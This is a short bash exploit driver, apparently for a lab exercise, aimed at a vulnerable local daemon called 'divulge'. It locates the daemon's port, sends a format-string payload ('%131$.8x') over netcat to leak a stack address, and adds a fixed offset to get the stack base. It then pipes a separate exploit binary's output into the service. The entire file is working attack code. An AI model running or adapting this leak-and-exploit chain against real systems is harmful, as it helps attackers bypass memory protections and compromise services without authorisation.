#!/bin/bash

# Port of the vulnerable daemon
PORT=$(sudo netstat -tulpn | grep divulge | grep -oP "(0.)+0:\K([0-9]+)")
# Offset calculated once with the help of /proc/PID/stat => always valid!
OFFSET=1180
# Address on the stack (hex)
PHEX=$(echo %131$.8x | nc localhost $PORT | awk '{print toupper($2)}')
# Convert address on the stack to decimal
PDEC=$(echo -e "ibase=16;$PHEX" | bc)
# Calculate stack base address from received address and fixed offset
STACK=$(($PDEC + $OFFSET))

# Run exploit with calculated stack base address
./divexploit $STACK | nc localhost $PORT
